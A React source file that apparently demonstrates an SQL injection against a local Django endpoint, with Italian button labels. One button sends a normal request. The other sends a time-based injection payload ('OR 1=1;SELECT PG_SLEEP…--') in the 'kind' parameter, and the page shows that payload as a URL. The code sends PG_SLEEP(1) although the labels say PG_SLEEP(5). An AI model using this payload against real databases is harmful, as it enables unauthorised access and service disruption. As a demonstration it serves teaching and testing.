import axios from "axios";
import { useState } from "react";
import Button from 'react-bootstrap/Button';
import { Table } from 'react-bootstrap'

const App = () => {

  const [gotGResponse,setGotGResponse] = useState("");


  const [gotBResponse,setGotBResponse] = useState("");

  const goodRequest = async () => {
    
    await axios.get("http://localhost:4131/trunc",{params:{"kind":"year"}});
    
    setGotGResponse("Risposta Ricevuta")

    setTimeout(() => {
      setGotGResponse("");
    }, 2000);
  }

  const badRequest = async () => {
    
    try {
      await axios.get("http://localhost:4131/trunc",{params:{"kind":"year', start_datetime)) OR 1=1;SELECT PG_SLEEP(1)--"}});
    } 
    
    catch (err) {
      setGotBResponse("SQL Injection Ricevuta")
      setTimeout(() => {
        setGotBResponse("");
      }, 2000);
    }
  }
  return (
    <div className="App">
      <h1>Django SQL Injection</h1>
    <Table striped>
      <tbody>
        <tr>
          <td>
            <Button onClick={goodRequest}>manda una richiesta legittima</Button>
          </td>
          <td>
            http://localhost:4131/trunc/?kind=year
          </td>
          <td>
            {gotGResponse}
          </td>
        </tr>
        <tr>
          <td>
            <Button onClick={badRequest}>manda una SQL Injection (eseguirà una PG_SLEEP(5))</Button>
          </td>
          <td>
          http://localhost:4131/trunc/?syear', start_datetime)) OR 1=1;SELECT PG_SLEEP(5)--
          </td>
          <td>
            {gotBResponse}
          </td>
        </tr>
      </tbody>
    </Table>
    </div>
  );
  }

export default App;
